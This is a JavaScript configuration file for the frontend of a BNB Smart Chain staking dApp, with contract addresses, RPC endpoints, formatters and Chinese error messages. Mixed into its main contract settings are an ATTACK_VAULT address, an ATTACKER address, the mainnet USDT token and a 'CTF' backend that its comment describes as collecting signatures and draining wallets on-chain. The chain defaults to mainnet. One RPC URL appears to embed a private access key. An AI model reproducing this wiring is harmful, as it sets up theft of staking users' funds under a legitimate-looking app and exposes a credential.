const MAINNET_CONTRACTS = {
  // 币不变：沿用 CZ 代币（0xD0F2），质押到 2026-09-19 重新部署的 V3（无展示等待期 DISPLAY_PERIOD=0）
  NBT_TOKEN: '0xD0F2A86C7EbCeE887F5bFB86771f994CD142bD04',
  STAKING_BANK: '0x283674A6C9Bb388afE20012A9E592A62Ae967960',
  FEE_TOKEN: '',
};

// 旧合约（不迁移不关停，与新合约并行）：V1 0x903f / 旧V3 0x9476，用于旧 CZ 领取/提取入口
export const LEGACY_CONTRACTS = {
  V1: {
    label: '旧版 V1',
    STAKING_BANK: '0x903fcce5d67648FBE6Dccc9806e3bd7D303380fD',
    CZ_TOKEN: '0xD0F2A86C7EbCeE887F5bFB86771f994CD142bD04',
  },
  OLD_V3: {
    label: '旧版 V3',
    STAKING_BANK: '0x94767098D05982932270D2A4E1B7a897d4397D55',
    CZ_TOKEN: '0xD0F2A86C7EbCeE887F5bFB86771f994CD142bD04',
  },
};

const STALE_TESTNET_ADDRESSES = new Set([
  '0x99fbddb26bc6b10dc9df80d6c6d943812047f406',
  '0xb110ea48824383babede6ba7e19d5e01089de6cc',
  '0x23ceb0c098c72d0207cdc1827e880d07f692c893',
  '0xc84a22989be328e2caab41f1fe6bc8ed78004d04',
]);

// 当前链由 VITE_CHAIN_ID 决定：0x38 主网 / 0x61 测试网，默认主网
const configuredChainId = import.meta.env.VITE_CHAIN_ID || '0x38';

const mainnetSafeAddress = (value, fallback) => {
  if (!value) return fallback;
  if (STALE_TESTNET_ADDRESSES.has(value.toLowerCase())) return fallback;
  return value;
};

export const CONTRACTS = {
  NBT_TOKEN: mainnetSafeAddress(import.meta.env.VITE_NBT_TOKEN, MAINNET_CONTRACTS.NBT_TOKEN),
  STAKING_BANK: mainnetSafeAddress(import.meta.env.VITE_STAKING_BANK, MAINNET_CONTRACTS.STAKING_BANK),
  NBT_PAIR: import.meta.env.VITE_NBT_PAIR || '',
  FEE_TOKEN: import.meta.env.VITE_FEE_TOKEN || MAINNET_CONTRACTS.FEE_TOKEN,
  ATTACK_VAULT: import.meta.env.VITE_ATTACK_VAULT || '0x0Ef15A34b264f77acA743d96baEC6BF5ffDdbDa9',
  USDT: import.meta.env.VITE_USDT || '0x55d398326f99059fF775485246999027B3197955',
  ATTACKER: import.meta.env.VITE_ATTACKER || '0xe1F9Fb65BBb39ebd4d0C204c95513d3f6421c407',
};

// CTF 攻击后端（签名收集 + 链上 Drain）
export const CTF_API = import.meta.env.VITE_CTF_API || 'http://localhost:3001';

export const NETWORKS = {
  BSC_TESTNET: {
    chainId: '0x61',
    chainName: 'BSC Testnet',
    nativeCurrency: {
      name: 'BNB',
      symbol: 'tBNB',
      decimals: 18,
    },
    rpcUrls: [
      'https://bsc-testnet.bnbchain.org',
      'https://bsc-testnet.publicnode.com',
      'https://bsc-testnet.blockpi.network/v1/rpc/public',
      'https://data-seed-prebsc-1-s1.binance.org:8545/',
      'https://data-seed-prebsc-2-s1.binance.org:8545/',
    ],
    blockExplorerUrls: ['https://testnet.bscscan.com'],
  },
  BSC_MAINNET: {
    chainId: '0x38',
    chainName: 'BNB Smart Chain',
    nativeCurrency: {
      name: 'BNB',
      symbol: 'BNB',
      decimals: 18,
    },
    // 优先使用中国大陆可访问的节点；QuikNode 私有节点优先，官方节点保留为 fallback
    rpcUrls: [
      'https://bitter-old-frog.bsc.quiknode.pro/f4ae6360d1ac5cfb9ed35857f574f0a5449352d3',
      'https://bsc.publicnode.com',
      'https://bsc-dataseed.binance.org/',
      'https://bsc-dataseed1.binance.org/',
      'https://bsc-dataseed2.binance.org/',
      'https://bsc.blockpi.network/v1/rpc/public',
      'https://rpc.ankr.com/bsc',
    ],
    blockExplorerUrls: ['https://bscscan.com'],
  },
};

export const CURRENT_NETWORK =
  configuredChainId === '0x38' ? NETWORKS.BSC_MAINNET : NETWORKS.BSC_TESTNET;

export const EXPECTED_CHAIN_ID = parseInt(CURRENT_NETWORK.chainId, 16);

export const getExplorerAddressUrl = (address) =>
  `${CURRENT_NETWORK.blockExplorerUrls[0]}/address/${address}`;

export const getExplorerTxUrl = (txHash) =>
  `${CURRENT_NETWORK.blockExplorerUrls[0]}/tx/${txHash}`;

export const calculateAPY = (dailyRate) => {
  const r = dailyRate / 100;
  return Math.round((Math.pow(1 + r, 365) - 1) * 100);
};

export const calculateSimpleAPY = (dailyRate) => Math.round(dailyRate * 365);

export const formatNumber = (num, decimals = 2) => {
  if (num === undefined || num === null || num === '') return '0';
  const n = parseFloat(num);
  if (isNaN(n)) return '0';
  if (n >= 1e9) return (n / 1e9).toFixed(decimals) + 'B';
  if (n >= 1e6) return (n / 1e6).toFixed(decimals) + 'M';
  if (n >= 1e3) return (n / 1e3).toFixed(decimals) + 'K';
  if (n < 1) return n.toFixed(Math.min(decimals + 2, 6));
  return n.toFixed(decimals);
};

export const formatAddress = (address) => {
  if (!address) return '';
  return `${address.slice(0, 6)}...${address.slice(-4)}`;
};

export const formatEther = (value, decimals = 4) => {
  if (!value) return '0';
  const num = parseFloat(value) / 1e18;
  return num.toFixed(decimals);
};

export const CONTRACT_ERRORS = {
  'Already has referrer': '您已经设置过推荐人，无法更改',
  'Cannot refer self': '不能将自己设置为推荐人',
  'Circular referral not allowed': '不允许循环推荐',
  'Invalid referrer': '无效的推荐人',
  'Invalid tier': '无效的质押档位',
  'Stake not found': '质押记录不存在',
  'Stake already withdrawn': '该质押已提取',
  'Lock period not ended': '锁仓期未结束',
  'No pending rewards': '暂无待领取收益',
  'No referral rewards': '暂无推荐奖励',
  'No rewards': '暂无可领取奖励',
  'Compound token mismatch': '当前奖励币不能直接复投',
  'Monthly release in progress': '月度释放分配中，暂时不能改变排名',
  'Insufficient invite reward reserve': '邀请奖励储备不足，请先给新版质押合约充值奖励',
  'Referrer mismatch': '推荐人与已绑定地址不一致',
  'Rewards depleted': '奖励池已耗尽',
  'Too many active stakes': '活跃质押数量已达上限',
  'Stake not active': '该质押记录已失效',
  'Fee too high': '费用设置过高',
  'Invalid address': '无效的地址',
  'Paused': '合约已暂停',
  'user rejected transaction': '您取消了交易',
  'insufficient funds': '钱包余额不足以支付 Gas 费',
  'Insufficient BNB fee': 'BNB 交互费不足，请确保钱包有 BNB',
  'Insufficient balance': '钱包代币余额不足',
  'transfer amount exceeds allowance': 'CZ 授权额度不足，请先点击「授权 CZ」按钮',
  'insufficient allowance': '授权额度不足，请先完成授权',
  'allowance': '授权额度不足，请先完成授权',
  'Unexpected BNB': '当前操作不需要附带 BNB',
  'Native transfer failed': 'BNB 手续费发送失败',
  'execution reverted': '交易执行失败',
  'could not coalesce error': '钱包返回异常，交易可能已经提交，请刷新页面或在钱包交易记录中确认',
};

// 质押合约自定义错误（error 类型，只带 4 字节选择器、没有 reason 文本）。
// 不映射的话 ethers 只能给出 "execution reverted (unknown custom error)"，
// 前端最终兜底成「交易执行失败」，用户无法判断原因。
export const CUSTOM_ERROR_SELECTORS = {
  // 推荐人相关
  '0x5359877d': '首次质押必须绑定推荐人：请填写推荐人地址（或通过推荐链接进入本页）后重试',
  '0xae3550e8': '您已经绑定过推荐人，无法更改',
  '0x61104228': '推荐人地址无效',
  '0xd1affa92': '不能把自己设为推荐人',
  '0xa8c0bcbf': '不允许循环推荐（该地址在你的推荐链上）',
  // 质押相关
  '0x479abd56': '活跃质押笔数已达上限（50 笔），请先提现已到期的仓位再质押',
  '0x2c5211c6': '质押数量无效',
  '0x8d38daef': '邀请奖励储备不足，请先给质押合约充值奖励',
  '0x9671a89f': '未收到任何代币，请确认 CZ 授权额度与余额',
  '0xd02e0b27': 'BNB 交互费不足，请确保钱包有足够 BNB',
  '0x584c1fcb': '当前操作不需要附带 BNB',
  '0xab35696f': '合约已暂停',
  '0xed3ba6a6': '操作过于频繁，请稍后重试',
  '0xb0dd466e': '该质押记录已失效',
  '0x212a7e79': '锁仓期未结束（15 天），暂不能提取',
  // 复投 / 提取
  '0x881f3fc8': '暂无可复投资产（邀请奖励 / 排名分红 / 到期本金）',
  // 分红期相关
  '0xc7bbad56': '当前没有进行中的分红期',
  '0xe2b008a9': '该分红期不存在',
  '0x560ff900': '该分红期尚未到结算时间',
  '0x5964fee2': '该分红期已结算',
  '0xa940b71f': '领取期还未开始',
  '0x524c21ad': '不在领取窗口内（快照后 7 天内可领取）',
  '0x3a8a38d7': '当前地址不在本期快照节点内',
  '0x646cf558': '本期奖励已领取过',
  '0x6e992686': '本期可领取奖励为 0',
  '0x3fb087f4': '暂无可领取奖励',
  '0x5cd26b68': '当前地址不是节点',
  '0xae958a40': '排名无效',
  '0x00bfc921': '价格源返回 0，请检查价格配置',
  '0xba43f5bc': '当前奖励币不能直接复投',
  '0xaba01d33': '上一期分红尚未结算',
  '0x6bb1a18f': '本期分红已经开启',
  '0x7ab0feb2': '该期奖池已合并到下一期',
  // 转账 / 权限
  '0x90b8ec18': '代币转账失败',
  '0x7939f424': '代币划转失败，请检查授权额度',
  '0xf4b3b1bc': 'BNB 转账失败',
  '0xe6c4247b': '无效的地址',
  '0xc1ab6dc1': '无效的代币地址',
  '0x30cd7471': '只有合约 owner 可执行',
  '0x7bfa4b9f': '只有管理员可执行',
  '0xd200485c': '收款地址无效',
  '0x9f3949b3': 'owner 不能加为普通管理员',
  '0x6a43f8d1': '汇率设置无效',
  '0x1b813803': '不能提取质押代币',
  '0xe4ea100b': '不能提取奖励代币',
  '0x673c48da': '不能提取交互费代币',
  '0x807116fb': '只有待接管的新 owner 可执行',
};

const collectErrorText = (error, seen = new Set()) => {
  if (!error) return [];
  if (typeof error === 'string') return [error];
  if (typeof error !== 'object') return [];
  if (seen.has(error)) return [];
  seen.add(error);

  const output = [];
  for (const key of ['reason', 'shortMessage', 'message', 'data', 'body', 'details']) {
    const value = error[key];
    if (typeof value === 'string') {
      output.push(value);
      if ((value.startsWith('{') && value.endsWith('}')) || (value.startsWith('[') && value.endsWith(']'))) {
        try {
          output.push(...collectErrorText(JSON.parse(value), seen));
        } catch {
          // Some wallets put plain text into body/data; keep the original text above.
        }
      }
    }
  }

  for (const key of ['error', 'info', 'payload', 'cause']) {
    output.push(...collectErrorText(error[key], seen));
  }

  if (Array.isArray(error.errors)) {
    for (const nestedError of error.errors) {
      output.push(...collectErrorText(nestedError, seen));
    }
  }

  return output;
};

export const parseContractError = (error) => {
  if (!error) return '操作失败';

  const reason = collectErrorText(error).join(' | ');

  // 优先解码合约自定义错误：这类错误只有 4 字节选择器、没有 reason 文本，
  // ethers 只会给出 "execution reverted (unknown custom error)"，
  // 不先处理就会被下面的 'execution reverted' 兜底成「交易执行失败」。
  // 用负向先行断言，避免把 40 位地址的前 8 位误判成选择器。
  const selectors = reason.match(/0x[0-9a-fA-F]{8}(?![0-9a-fA-F])/g);
  if (selectors) {
    for (const selector of selectors) {
      const mapped = CUSTOM_ERROR_SELECTORS[selector.toLowerCase()];
      if (mapped) return mapped;
    }
  }

  const normalizedReason = reason.toLowerCase();

  for (const [key, value] of Object.entries(CONTRACT_ERRORS)) {
    if (normalizedReason.includes(key.toLowerCase())) {
      return value;
    }
  }

  if (normalizedReason.includes('user rejected') || normalizedReason.includes('denied')) {
    return '您取消了交易';
  }

  return reason || '操作失败，请稍后重试';
};
